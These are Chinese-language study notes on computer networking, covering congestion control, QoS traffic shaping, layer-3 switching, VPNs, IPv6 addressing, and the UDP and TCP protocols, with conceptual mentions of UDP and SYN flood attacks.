##### 拥塞控制（congestion control）

需要确保通信子网能够承载用户提交的通信量，是一个全局性问题，涉及主机、路由器等多种因素

##### 产生拥塞的原因

- 主机发送到网络的数据包数量过多，超过了网络的承载能力
- 突发的流量填满了路由器的缓冲区，造成某些数据包会被丢弃

##### 拥塞控制的基本策略

- **开环控制**----事先对通信流参数进行协商，协商后，不管网络是拥塞还是带宽充足，参数不能动态改变
  - 开环控制属于预防性拥塞控制，它竭力使网络总是处于无拥塞状态运行。开环控制的方法包括决定什么时候接受新流量，什么时候丢弃数据包和丢弃哪些数据包。其缺点是没有考虑网络的当前状态
- **闭环控制**—根据网络状态进行**动态控制**，包括两部分：**反馈机制**和**控制机制**。闭环控制方法分为两个子类：**显式反馈**与**隐式反馈**

#### 2.4.9.2 流量调节

- **抑制包(Choke Packets)**：用于通知发送方减小发送量，路由器选择一个被拥塞的数据包，给该数据包的源主机返回一个抑制包，抑制包中的目的地址取自该拥塞数据包。源主机收到抑制包后，减少发向特定目的地址的流量

- **逐跳的抑制包(Hop-by-Hop Choke Packets)**：在高速或长距离网络中，由于源主机响应太慢，抑制包算法对拥塞控制的效果并不好，可采用逐跳抑制方法；其核心思想是抑制包对它经过的每个路由器都起作用，能够迅速缓解发生拥塞处的拥塞，但要求上游路由器有更大的缓冲区

- **显式拥塞通告（ECN，Explicit Congestion Notification）**，在IP包头中记录数据包是否经历了拥塞。在数据包转发过程中，路由器可以在包头中标记为经历拥塞，然后接收方在它的下一个应答数据包里显示该标记作为显式拥塞信号

- **RFC2474中重新定义TOS域为包含一个6位的区分服务码点(DSCP) 和2位未使用位；RFC3168重新定义RFC2474中TOS域未使用的两位为ECN域**，包含如下值：

  - 00：发送主机不支持ECN

  - 01或者10：发送主机支持ECN

  - 11：路由器正在经历拥塞

#### 2.4.9.3 随机早期检测RED (Random Early Detection)

- 使路由器的队列维持两个参数，即队列长度最小门限THmin和最大门限THmax
- RED对每一个到达的数据报都先计算平均队列长度LAV
- 若平均队列长度小于最小门限THmin，则将新到达的数据报放入队列进行排队
- 若平均队列长度超过最大门限THmax，则将新到达的数据报丢弃
- 若平均队列长度在最小门限THmin和最大门限THmax之间，则按照某一概率p将新到达的数据报丢弃
- RED将路由器的到达队列划分成为三个区域

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220603194444501.png" alt="image-20220603194444501" style="zoom: 50%;" />

**丢弃概率 p 与 THmin 和 Thmax 的关系**

- 当 LAV <Thmin 时，丢弃概率 p = 0
- 当 LAV >Thmax 时，丢弃概率 p = 1
- 当 THmin < LAV < THmax时， 0  p  1
  例如，按线性规律变化，从 0 变到 pmax

### 2.4.10 服务质量

#### 2.4.10.1 概述

**问题的提出**

- 互联网本身只能提供“尽力而为的服务”或称“尽最大努力交付的服务”
- 当互联网越来越多的用于传输多媒体信息时，由于这些实时业务对网络的传输延时、延时抖动等特性较为敏感，这样网络的传输质量就难以保障了
- IP网络不能保证特定业务的QoS要求，已经成为IP网络发展的巨大障碍
- 网络的服务质量越来越多的引起人们的关注，甚至成为网络技术研究的热点问题

**什么是网络服务质量？（QoS, Quality of Service）**

QoS是网络在传输数据流时要满足一系列服务请求，具体可以量化为带宽、时延、抖动、丢包率等性能指标

#### 2.4.10.2 流量整形

**流量整形(traffic shaping)**：其作用是限制流出某一网络的某一连接的流量与突发，使这类报文以比较均匀的速度向外发送

**1.漏桶算法**

- 到达的数据包（网络层的PDU）被放置在底部具有漏孔的桶中（数据包缓存）
- 漏桶最多可以排队b个字节，漏桶的这个尺寸受限于内存。如果数据包到达的时候漏桶已经满了，那么数据包应被丢弃
- 数据包从漏桶中漏出，以常量速率（r字节/秒）注入网络，因此平滑了突发流量

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220603194744048.png" alt="image-20220603194744048" style="zoom:50%;" />

**2.令牌桶算法**

- 产生令牌：周期性的以速率r向令牌桶中增加令牌，桶中的令牌不断增多。如果桶中令牌数已到达上限，则丢弃多余令牌
- 消耗令牌：输入数据包会消耗桶中的令牌。在网络传输中，数据包的大小通常不一致。大的数据包相较于小的数据包消耗的令牌要多
- 判断是否通过：输入数据包经过令牌桶时存在两种可能：输出该数据包或者被丢弃。当桶中的令牌数量可以满足数据包对令牌的需求，则将数据包输出，否则将其丢弃

**注**：漏桶算法和令牌桶算法的区别在于漏桶算法输出的流量永远不可能超过一定限制，而令牌桶算法可以容忍短时间内的高流量输出，对于一些突发流量的需求比较友好

#### 2.4.10.3 数据包调度

在同一个流的数据包之间以及在竞争流之间**分配路由器资源**的算法称为**包调度算法**，它负责分配带宽和其他路由器资源，负责确定把缓冲区中的哪些数据包发送到输出链路上

- 先来先服务FCFS（First-Come First-Serve）
- 公平队列算法（Fair Queueing/Round Robin）
- 加权公平队列算法（Weighted Fair Queueing）
- 优先级调度（Priority Scheduling）

### 2.4.11 三层交换

#### 2.4.11.1 三层交换的技术背景

- 二层交换网络中的广播，限制了网络规模的扩展

  - 交换机对目标地址无法匹配的数据帧进行广播转发

  - 交换机对目标地址为广播地址的数据帧进行广播转发

  - 交换机为维护生成树状态产生大量的桥协议数据单元(Bridge Protocol Data Unit，BPDU)

  - 这些广播帧会大量消耗网络资源，并频繁影响用户的数据通信

- VLAN虽然可以将广播的影响限定在一定范围内，但同时也隔离了正常的用户间数据通信

- 传统路由器致力于解决VLAN间互联互通，但是其转发效率和拓扑复杂性带来的网络通信瓶颈无法有效应对规模扩展

#### 2.4.11.2 三层交换的动机

- 利用第三层协议中的信息来加强第二层交换功能，形成带有路由功能的交换
- 融合VLAN 间的二层隔离和三层互通，消除大规模网络中广播对性能的影响
- 简化网络配置，简化网络拓扑，优化网络管理，降低网络部署成本

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220603195121191.png" alt="image-20220603195121191" style="zoom:67%;" />

#### 2.4.11.3 三层交换机的工作原理

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220603195205159.png" alt="image-20220603195205159" style="zoom: 67%;" />

### 2.4.12 虚拟专用网VPN (Virtual Private Network)

#### 2.4.12.1 VPN的技术背景

- 计算机网络按用途分类

  - 专用、公用

- 专用网络的实现方式

  - 使用专用链路：铺设、租用（费用高，不灵活）

  - 使用公共链路：不安全

- 虚拟专用网VPN (Virtual Private Network)

  - 专用网络的经济、可靠、灵活的解决方案

  - 利用安全隧道技术将专用网络在公共网络上扩展

- VPN的设计原则

  - 安全性、隧道与加密、数据验证、用户验证、防火墙与攻击检测

#### 2.4.12.2 VPN的原理

- VPN指利用公用网络架设专用网络的远程访问技术
- VPN通过隧道技术在公共网络上模拟出一条点到点的逻辑专线，从而达到安全数据传输的目的

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220603195428280.png" alt="image-20220603195428280" style="zoom:67%;" />

- VPN对数据机密性和完整性的保护

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220603195530863.png" alt="image-20220603195530863" style="zoom: 67%;" />

#### 2.4.12.3 VPN的实现方式

- 用VPN连接合作伙伴

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220603195616176.png" alt="image-20220603195616176" style="zoom: 50%;" />

- 用VPN实现专用网络的远程访问

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220603195656139.png" alt="image-20220603195656139" style="zoom:50%;" />

### 2.4.13 IPv6协议

初始动机：应付“32-bit地址空间耗尽”问题（CIDR和NAT都无法从根本上解决地址短缺问题），增加地址空间。
IPv6 地址

- 地址长度为128bit，是IPv4地址长度的4倍

- IPv6地址空间数量约为3*1038

- IPv6地址表示法，冒分十六进制，x:x : x: x :x : x: x: x

  - 简化方法：每个x前面的0可省略，可把连续的值为0的x表示为“::”, 且“::”只能出现1次

  - 简化前地址，2001:0DA8:0000:0000:200C:0000:0000:00A5

  - 简化后地址，2001:DA8:0000:0000:200C::A5

## 2.5 传输层

### 2.5.1 概述

传输层位于应用层和网络层之间：

- 基于网络层提供的服务，向分布式应用程序提供通信服务

按照因特网的“端到端”设计原则：

- **应用程序只运行在终端上**，即不需要为网络设备编写程序

站在应用程序的角度：

- 传输层应提供**进程之间本地通信的抽象**：即运行在不同终端上的应用进程仿佛是直接连在一起的

#### 2.5.1.1 套接字

设想在应用程序和网络之间存在一扇“门”：

- 需要发送报文时：发送进程将报文推到门外
- 门外的运输设施（因特网）将报文送到接收进程的门口
- 需要接收报文时：接收进程打开门，即可收到报文

在TCP/IP网络中，这扇“门”称为**套接字（socket）**，是**应用层和传输层的接口**，也是应用程序和网络之间的API

#### 2.5.1.2 传输层提供的服务

因特网的网络层提供“**尽力而为**”的服务：

- 网络层尽最大努力在终端间交付分组，但不提供任何承诺
- 具体来说，不保证交付，不保证按序交付，不保证数据完整，不保证延迟，不保证带宽等

传输层的**有所为、有所不为**:

- 传输层可以通过差错恢复、重排序等手段提供可靠、按序的交付服务
- 但传输层无法提供延迟保证、带宽保证等服务

#### 2.5.1.3 因特网传输层提供的服务

最低限度的传输服务：

- 将终端-终端的数据交付扩展到进程-进程的数据交付
- 报文检错

增强服务：

- 可靠数据传输
- 流量控制
- 拥塞控制

因特网传输层通过UDP协议和TCP协议，向应用层提供两种不同的传输服务：

- UDP协议：仅提供最低限度的传输服务
- TCP协议：提供基础服务和增强服务

### 2.5.2.传输层基本服务——复用和分用

#### 2.5.2.1 复用和分用概述

传输层基本服务：将主机间交付扩展到进程间交付，通过复用和分用实现

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220603200929254.png" alt="image-20220603200929254" style="zoom:67%;" />

- **复用**：
  发送方传输层将套接字标识置于报文段中，交给网络层
- **分用**：
  接收方传输层根据报文段中的套接字标识，将报文段交付到正确的套接字

#### 2.5.2.2 套接字标识与端口号

端口号是套接字标识的一部分：

- 每个套接字在本地关联一个端口号
- 端口号是一个16比特的数

端口号的分类：

- 熟知端口：0～1023，由公共域协议使用
- 注册端口：1024～49151，需要向IANA注册才能使用
- 动态和/或私有端口：49152～65535，一般程序使用

报文段中有两个字段携带端口号

- 源端口号：与发送进程关联的本地端口号
- 目的端口号：与接收进程关联的本地端口号

#### 2.5.2.3 TCP/UDP套接字（复用和分用）

##### UDP套接字

- 使用<IP地址，端口号>二元组标识UDP套接字
- 服务器使用一个套接字服务所有客户

##### TCP套接字

- 使用<源IP地址，目的IP地址，源端口号，目的端口号> 四元组标识连接套接字
- 服务器使用一个监听套接字和多个连接套接字服务多个客户，每个连接套接字服务一个客户





### 2.5.3 UDP协议

[网络-UDP协议详解（代码、实战）](https://blog.csdn.net/lady_killer9/article/details/110533511)

#### 2.5.3.1  简介

UDP（User Datagram Protocol，用户数据报协议），一种无连接的传输层协议，提供面向事务的简单不可靠信息传送服务，**UDP在IP报文的协议号是17**。常用的UDP端口号有：53（DNS）、69（TFTP）、161（SNMP），使用UDP协议包括：TFTP、SNMP、NFS、DNS、BOOTP、CoAP、DTLS。

#### 2.5.3.2  特点

- UDP是**无连接**的，减少开销和发送数据之前的时延
- UDP使用最大努力交付，即**不保证可靠**交付
- UDP是**面向报文**的，适合一次性传输少量数据的网络应用
- UDP**无拥塞控制**，适合很多**实时**应用

- UDP 支持一对一、一对多、多对一和多对多交互通信。
- 首部开销小，仅8个字节（TCP首部为20个字节）

#### 2.5.3.3  报文格式

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506201458132.png" alt="image-20220506201458132" style="zoom:50%;" />

- 源端口号：在需要对方回信时选用，**不需要**时可用全0。
- 目的端口号：这在终点交付报文时**必须使用**。
- 长度：UDP用户数据报的总长度（首部+数据），其**最小值是8**(仅有首部)。
- 检验和：检测UDP用户数据报在传输中是否有错，**有错就丢弃**。

如果接收方发现收到的报文中的目的端口号不正确(即不存在对应于该端口号的应用进程)，就丢弃该报文，并由网际控制报文协议ICMP发送“端口不可达”差错报文给发送方。我们在ICMP的应用举例讨论 traceroute时，就是让发送的UDP用户数据报故意使用一个非法的UDP端口，结果ICMP就返回“端口不可达”差错报文因而达到了测试的目的。

#### 2.5.3.4  UDP校验

##### 伪首部

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506201609707.png" alt="image-20220506201609707" style="zoom:50%;" />

- 源IP地址：4个字节
- 目的IP地址：4个字节
- 0：1个字节，即0x00
- 17：1个字节，即0x11，封装UDP报文的IP数据包首部协议字段是17
- UDP长度：2个字节，UDP首部（8B)+数据部分长度，不包括伪首部

伪首部仅在计算校验和的时候才出现，**不向下传送也不向上递交**。

##### 发送端校验

1. 填上伪首部
2. 全0填充检验和字段
3. 全0填充数据部分(UDP数据报要看成许多4B的字串接起来)
4. 伪首部+首部+数据部分采用二进制反码求和
5. 把和求反码，填入校验和字段
6. 去掉伪首部，发送

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506201724814.png" alt="image-20220506201724814" style="zoom:50%;" />

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506201803072.png" alt="image-20220506201803072" style="zoom:50%;" />

按列计算：9（1001），余1，进100；7+0=1（111），余1进11；7+1=8（1000)，余0进100；...后续读者动手计算吧，记得多出去的进位回加到低位，如果不习惯一起算，可以两个加一次。16位的话按列计算16次左右，如果有二三十个相加的话，按列相加比较快速，使用16进制相加也会更快一点。

##### 接收端校验

1. 填上伪首部
2. 伪首部+首部+数据部分采用二进制反码求和（校验和部分不是全0了，而是0110100100010010）
3. 结果全为1，则无差错，否则丢弃数据报/交给应用层附上出差错的警告。

计算过程和上面一样，只是校验和变了。

这样的检验和， 既检查了UDP用户数据报的源端口号和目的端口号以及UDP用户数据报的数据部分，又检查了IP数据报的源IP地址和目的地址。

#### 2.5.3.5 为什么需要UDP？

**为什么需要UDP？**

应用可以尽可能快地发送报文：

- 无建立连接的延迟
- 不限制发送速率（不进行拥塞控制和流量控制）

报头开销小

协议处理简单

**UDP适合哪些应用？**

- 容忍丢包但对延迟敏感的应用：如流媒体
- 以单次请求/响应为主的应用：如DNS
- 若应用要求基于UDP进行可靠传输：由应用层实现可靠性

#### 2.5.3.6 实战

UDP泛洪攻击（UDP Flood Attack），攻击者发送伪造源地址和端口不可达的UDP数据报，当受害系统接收到一个 UDP 数据报的时候，它会确定目的端口正在等待中的应用程序。当它发现该端口中并不存在正在等待的应用程序，它就会产生一个目的地址无法连接的ICMP数据包发送给该伪造的源地址。如果发送的足够多的，就会消耗受害系统的资源，造成攻击。和TCP是SYN攻击差不多，也是(D)DoS攻击的一种。

自己实现UDP客户端和服务器端可以查看文章：[python-网络编程之socket](https://blog.csdn.net/lady_killer9/article/details/107000864)

#### 2.5.3.7 参考

《TCP/IP详解I》

《计算机网络（谢希仁）第七版》

[RFC 768](https://datatracker.ietf.org/doc/rfc768/)

### 2.5.4 TCP协议

[网络-TCP协议详解自学笔记（例题、代码、实战）](https://blog.csdn.net/lady_killer9/article/details/109587532)

#### 2.5.4.1 简介

TCP（Transmission Control Protocol，传输控制协议）是一种**面向连接的、可靠的、基于字节流的**传输层通信协议，由 RFC793 定义。它的连接是**虚连接**，连接的端点是**套接字（SOCKET）**。它的可靠性体现在：3次握手**建立连接**，**滑动窗口**机制，一定的**拥塞避免**算法，**流量控制**，以及一定的**超时重传**机制。基于TCP的协议有HTTP、FTP、SMTP、TELNET、SSH、MQTT等。

#### 2.5.4.2  TCP的服务与缓存

##### 服务

谈TCP服务之前先说一下计时器，很多服务需要计时器的支持。

- **2MSL计时器**测量一个连接处于TIME_WAIT状态的时间，**四次挥手**（连接释放）时有用到。
- **重传计时器**使用于当希望收到另一端的确认。**超时重传、拥塞避免**时有用到。
- **坚持计时器**使窗口大小信息保持不断流动，即接收端发送了接收窗口为0的报文后启动。**流量控制**时有用到。
- **保活计时器**可检测到一个空闲连接的另一端何时崩溃或重启。

接下来是TCP提供的服务：

**数据块分割**：应用数据被分割成TCP认为最适合发送的数据块，由TCP传递给IP的信息单位称为**报文段或段（segment）**。

**重新排序**：既然TCP报文段作为IP数据报来传输，而IP数据报的到达可能会**失序**，因此TCP报文段的到达也可能会失序。如果必要，TCP将对收到的数据进行**重新排序**，将收到的数据以正确的顺序交给应用层。

**全双工(Full Duplex)通信**：又称为双向同时通信，即通信的**双方**可以**同时发送和接收**信息的信息交互方式。

**可靠传输**：通过校验和、序号、确认与重传进行可靠的传输。

**流量控制**：通过**滑动窗口**算法，设置接收窗口大小来进行流量控制。

**拥塞控制**：通过**慢开始&拥塞避免、快重传&快恢复**算法进行拥塞控制。

不提供广播或多播的服务。

##### 缓存

**发送缓存**：准备发送的数据和已发送但未收到确认的数据

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220514164038240.png" alt="image-20220514164038240" style="zoom: 67%;" />

图中红色部分为已发送但未收到确认的数据，发送缓存中的其余部分为准备发送的数据。

**接收缓存**：按序到达但未接受应用程序读取的数据和不按序到达的数据

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220514164109529.png" alt="image-20220514164109529" style="zoom:67%;" />

图中接收缓存中标识“已收到”的表示按序到达但未接受应用程序读取的数据，接收窗口中的红色部分是不按序到达的数据。

#### 2.5.4.3  TCP头部

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220514164138879.png" alt="image-20220514164138879" style="zoom:67%;" />

- **源端口和目的端口**：各占2字节。端口是传输层与应用层的服务接口.传输层的复用和分用功能都要通过端口才能实现
- **序号seq**：占4字节。数据中首个字节在发送缓存中的序号。
- **确认序号ack**：占4字节。为N时表明序号N-1及之前的报文段都已经收到，期待接收序号为N的报文段。
- **首部长度/数据偏移**: 占4位。它指出 TCP 报文段的数据起始处距离TCP报文段的起始处有多远.“数据偏移”的单位是32位字(以 4 字节为计算单位)。
- **紧急位URG**： 为1时，紧急指针有效，紧急数据优先级更高，优先发送。
- **确认位ACK**： 为1时，确认序号ack有效，连接建立后，传送的报文段都必须把ACK置为1。
- **推送位PSH**： 为1时，接收方应该尽快将这个报文段交给应用层，不用等缓存填满，优先级更高，报文段优先交给应用层。
- **复位RST**： 为1时，表明TCP连接中出现严重差错，需要释放连接后，重建连接。
- **同步位SYN**： 为1时，用来发起/确认一个连接。
- **终止位FIN**： 为1时，表明发端完成发送任务，要求释放连接。
- **窗口**：接收窗口，即允许对方发送的数据量。
- **检验和**：检验首部+数据
- **紧急指针**：URG为1时有效，指出本报文段中紧急数据的字节数（从数据的第一个字节开始）。
- **选项**：最大报文段长度MSS(Maximum Segment Size)：发送方告诉接收方，自身缓存所能接收的报文段的数据字段的最大长度是MSS个字节。

​       窗口扩大：占3字节,其中有一个字节表示移位值S.新的窗口值等于TCP 首部中的窗口位数增大到(16 + S),相当于把窗口值向左移动 S 位后获得实际的窗口大小

​		时间戳：占10字节,其中最主要的字段时间戳值字段(4字节)和时间戳回送回答字段(4字节)

​		选择确认：接收方收到了和前面的字节流不连续的两字节。如果这些字节的序号都在接收窗口之内，那么接收方就先收下这些数据，但要把这些信息准确地告诉发送方，使发送方不要再重复发送这些已收到的数据。

- **填充**：这是为了使整个首部长度是4字节的整数倍。

#### 2.5.4.4 TCP的建立与终止

TCP连接的建立采用**客户/服务器**方式，**主动**发起连接建立的应用进程叫做**客户**，而**被动**等待连接建立的应用进程叫**服务器**。

TCP连接四元组(sip,sport,dip,dport)，（源ip、源端口号、目的ip、目的端口号）。
##### 三次握手

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220514164759287.png" alt="image-20220514164759287" style="zoom:67%;" />

1. 客户端发送连接请求报文段，无应用层数据。同步位SYN=1，表示请求连接。序号seq=x（随机)。确认序号无效，ACK=0，因为客户端未收到服务器端的报文段。
2. 服务器为该TCP连接分配**缓存**和变量，向客户端返回确认报文段，允许连接，无应用层数据。同步位SYN=1，表示确认连接。序号seq=y（随机），确认位ACK=1，确认序号有效，确认序号ack=x+1，即x+1之前的已经收到，期待接收x+1开始的报文段。
3. 客户端为该TCP连接分配**缓存**和变量，并向服务器端返回确认报文段，可以携带数据。同步位SYN=0，表示连接建立完毕，以后的也是0。序号seq=x+1。确认位ACK=1，确认序号ack=y+1，即y+1之前的已经收到，期待接收y+1开始的报文段。

**CLOSED**: 表示初始关闭状态。

**LISTEN（服务器）**: 这个也是非常容易理解的一个状态，表示服务器端的某个SOCKET处于监听状态，可以接受连接了。

**SYN-SENT**: 这个状态与SYN-RCVD呼应，当客户端SOCKET执行CONNECT连接时，它首先发送SYN报文，因此也随即它会进入到了SYN-SENT状态，并等待服务端的发送三次握手中的第2个报文。SYN-SENT状态表示客户端已发送SYN报文。

**SYN-RCVD（服务器）**: 这个状态表示接受到了SYN报文，在正常情况下，这个状态是服务器端的SOCKET在建立TCP连接时的三次握手会话过程中的一个中间状态，很短暂，基本上很难看到这种状态的，除非你特意写了一个客户端测试程序，故意将三次TCP握手过程中最后一个ACK报文不予发送。当收到客户端的ACK报文后，它会进入到ESTABLISHED状态。

**ESTABLISHED**：这个容易理解了，表示连接已经建立了，可以发送数据。

**SYN洪泛攻击**：攻击者向服务器发送大量TCP连接请求，服务器确认后，攻击者**不确认**，造成服务器处于**半连接**状态，消耗了过多的资源（CPU、内存等），造成死机等问题，无法为正常用户提供服务。可使用SYN Cookie进行防御。

##### 四次挥手

**客户端和服务器端都可以终止该连接**，连接结束后，主机中的资源被释放。

以客户端主动终止连接为例。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220514165252860.png" alt="image-20220514165252860" style="zoom:50%;" />

1. 客户端发送连接释放报文段，停止发送数据。结束位FIN=1，表明要释放报文段，序号seq=u，假设上一个报文段序号为u-1。
2. 服务器端回复一个确认报文段，客户到服务器这个方向的连接就释放了——**半关闭状态**。确认位ACK=1，序号seq=v，假设上一个报文段序号为v-1，确认序号ack=u+1。
3. 服务器端发完数据，就发出连接释放报文段，主动关闭TCP连接。结束位FIN=1，确认位ACK=1，序号seq=w（服务器端上次发送的数据序号为v~w-1），确认序号ack=u+1（因为客户端未发送数据）。
4. 客户端回复一个确认报文段。确认位ACK=1，序号seq=u+1，确认序号ack=w+1。

**ESTABLISHED**：建立连接成功，通信中。

**CLOSE-WAIT**： 表示被动关闭一方在**等待关闭**。当主动关闭连接的一方关闭SOCKET后发送FIN报文给被动关闭一方，被动关闭一方回应一个ACK报文给对方，此时被动关闭一方则进入到CLOSE-WAIT状态

**FIN-WAIT-1**：是当Socket在已经连接的状态时**主动关闭连接**，向对方发送了FIN报文，此时该Socket进入到FIN-WAIT-1状态。而当对方回应ACK报文后，则进入到FIN-WAIT-2状态

**FIN-WAIT-2**：**表示半连接**，挥了两次手的状态等待对方的Fin报文

**TIM-WAIT**：TCP协议中主动关闭连接的一方要处于TIME-WAIT状态，等待两个MSL（maximum segment lifetime）的时间后才能回到CLOSED状态，在TIME-WAIT期间仍然不能再次监听同样的server端口。

**LAST-ACK**: 被动关闭一方在发送FIN报 文后，最后等待对方的ACK报文。当收到ACK报文后进入CLOSED状态。

**CLOSED**：已经完全关闭.

服务器端收到确认报文段后关闭TCP连接。客户端等待两倍的MSL(Maximum Segment Lifetime，报文段最长寿命)时间后关闭连接，因为如果服务器端没有收到客户端回复的确认报文段会再次发出连接释放报文段，2MSL后没有收到服务器端再次发出的连接释放报文段，说明服务器端已关闭。

##### 例题

[例题]主机甲与主机乙之间已建立一个TCP连接，主机甲向主机乙发送了两个连续的TCP段，分别包含300字节和500字节的有效载荷，第一个段的序列号为200，主机乙正确接收到两个段后，发送给主机甲的确认序列号是

A.500 B.700 C.800 D.1000

[解析]确认序号即期待的下一个报文段的开始字节，由于主机乙正确接收了两个段，所以乙收到了200~999（200+800-1）字节，期待第1000字节，所以选择D选项。

##### 有限状态机

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220514165605062.png" alt="image-20220514165605062" style="zoom:67%;" />

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220602104922375.png" alt="image-20220602104922375" style="zoom:50%;" />

粗实线为客户端三次握手与四次挥手的状态转移，粗虚线为服务器端三次握手与四次挥手的状态转移。

#### 2.5.4.5 流水线技术

##### 可靠传输

##### 校验

增加伪首部

##### 滑动窗口

以**字节**为单位的滑动窗口，大小可变。

**接收窗口rwnd**(recevier window)：接收方根据接收缓存设置的值通知发送方，反映接收方容量。

**拥塞窗口cwnd**(congestion window)：发送方根据自己估算的网络拥塞程度而设置的窗口值，反应网络当前容量。初始值IW根据SMSS（SENDER MAXIMUM SEGMENT SIZE，发送方最大报文段大小，不包含TCP头部）来设定。

**发送窗口** = Min{接收窗口rwnd，拥塞窗口cwnd}

##### 累计确认与超时重传

**超时重传**：TCP发送方在规定的时间（重传时间，使用重传计时器）内**没有收到确认就要重传**已发送的报文段。【重传时间：采用自适应算法，**动态改变重传时间**RTTs（加权平均往返时间）。RTT（round-trip time）为数据完全发送完（交给发送方IP层）到收到确认信号的时间。】

**累计确认**：收到多个确认一次。接收方“痴心不改”，例如，收到序号1、2、3、6的报文段，到了时间会发送确认序号ack=4的报文段，即使后续再收到了7、5，也依然会通知发送方“小老弟，我还是想要序号为4的报文段”。

**超时重传解决的是传输可靠性问题，累计确认是为了更快速的传输。**

##### 冗余确认与快速重传

**冗余确认**：TCP接收方已经发送过的确认报文段。由于**收到了比确认报文段所期待的报文段序号更大的报文段**，而未收到确认报文段所期待的报文段，则再次发送确认报文段。如前面的序号4。【冗余确认是原因可能是乱序到达和丢包，两次的话可能是乱序到达造成的，三次的话绝大部分是丢包了，需要快速重传。】

快速重传：TCP发送方在未达到重传时间时收到接收方的**冗余**确认（三个重复的）就要重传已发送的报文段。

由于信道上一直有数据不间断地传送，这种传输方式可获得很高的信道利用率。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220603234701437.png" alt="image-20220603234701437" style="zoom:50%;" />

##### 1.GBN协议（回退N步协议）

**发送窗口**
发送方维持的发送窗口，它的意义是：位于发送窗口内的分组都可连续发送出去，而不需要等待对方的确认。这样，信道利用率就提高了。
发送方每收到一个确认，就把发送窗口向前滑动一个分组的位置。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220603234756936.png" alt="image-20220603234756936" style="zoom:50%;" />

**累积确认**

- 接收方一般采用累积确认的方式。即不必对收到的分组逐个发送确认，而是**对按序到达的最后一个分组发送确认**，这样就表示：**到这个分组为止的所有分组都已正确收到了**。
- 优点：容易实现，即使确认丢失也不必重传。
- 缺点：不能向发送方反映出接收方已经正确收到的所有分组的信息。

如果发送方发送了前5个分组，而中间的第3个分组丢失了。这时接收方只能对前两个分组发出确认。发送方无法知道后面三个分组的下落，而只好把后面的三个分组都再重传一次。
这就叫做**Go-back-N（回退N）**，表示**需要再退回来重传已发送过的N个分组**。
可见当通信线路质量不好时，连续ARQ协议会带来负面的影响。

##### 2.SR 协议（选择重传协议）

SR 协议在 GBN 协议的基础上进行了改进，它通过让发送方仅重传那些它怀疑在接收方出错（即丢失或受损）的分组而避免了不必要的重传。选择重传协议只重传真正丢失的分组。

- 选择重传的接收窗口与发送窗口一样大

- 选择重传协议允许与接收窗口一样多的分组失序到达,并保存这些失序到达的分组,直到连续的一组分组被交付给应用层。

- 标记发出分组,当ACK=Sf 时,将窗口滑过所有连续的已确认的分组

  - 如果还有未确认的分组,则重发所有检测到的未被确认的分组并重启计时器

  - 如果所有分组都被确认了则停止计时器

- 确认，确认号(ACK)只定义完好接收的那一个分组的序号,并不反馈任何其他分组的信息

**注**：SR协议ack确认和GBN的累计确认不同，是一个一个确认

> **计时器**
>
> 理论上选择重传协议要为每个分组使用一个计时器。当某个计时器超时后,只有相应的分组被重传。换而言之，返回N协议将所有的分组当做一个整体对待，而选择重传协议则分别对待每一个分组。但是大多数SR的运输层仅使用了一个计时器.。注意只使用一个计时器而做到跟踪所有发出去的分组的情况的做法是：标记发出分组,当ACK=Sf 时,将窗口滑过所有连续的已确认的分组，如果还有未确认的分组，则重发所有检测到的未被确认的分组并重启计时器，如果所有分组都被确认了则停止计时器。

> **快速重传**
>
> 仅靠超时重发丢失的报文段，恢复太慢！
>
> 发送方可利用重复ACK检测报文段丢失：
>
> - 发送方通常连续发送许多报文段
> - 若仅有个别报文段丢失，发送方将收到多个重复序号的ACK
> - 多数情况下IP按序交付分组，重复ACK极有可能因丢包产生
>
> TCP协议规定： 当发送方收到对同一序号的3次重复确认时，立即重发包含该序号的报文段
>
> 所谓快速重传，就是在定时器到期前重发丢失的报文段

##### 3.TCP 可靠通信的具体实现

- TCP连接的每一端都必须设有两个窗口——一个**发送窗口**和一个**接收窗口**。
- TCP的可靠传输机制用**字节的序号**进行控制。TCP所有的确认都是基于序号而不是基于报文段。
- TCP两端的四个窗口经常处于**动态变化**之中。
- TCP连接的往返时间RTT也不是固定不变的。需要使用特定的算法**估算较为合理的重传时间**

##### GBN、SR和TCP小结

> **Go-Back-N协议**
> 接收方：
>
> - 使用累积确认
> - **不缓存失序的分组**
> - 对失序分组发送重复ACK
>
> 发送方：
>
> - 超时后重传从基序号开始的所有分组
>
> **SR**
> 接收方：
>
> - 缓存失序的分组
> - 单独确认每个正确收到的分组
>
> 发送方：
>
> - 每个分组使用一个定时器
> - 仅重传未被确认的分组
>
> **TCP协议**
>
> 接收方：
>
> - 使用累积确认
> - **缓存失序的报文段**
> - 对失序报文段发送重复ACK
> - **增加了推迟确认**
>
> 发送方：
>
> - 超时后仅重传最早未确认的报文段
> - **增加了快速重传**

#### 2.5.4.6 TCP报文段结构

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220604000435122.png" alt="image-20220604000435122" style="zoom:50%;" />



最大段长度（MSS）：

- TCP段中可以携带的最大数据字节数
- 建立连接时，每个主机可声明自己能够接受的MSS，缺省为536字节

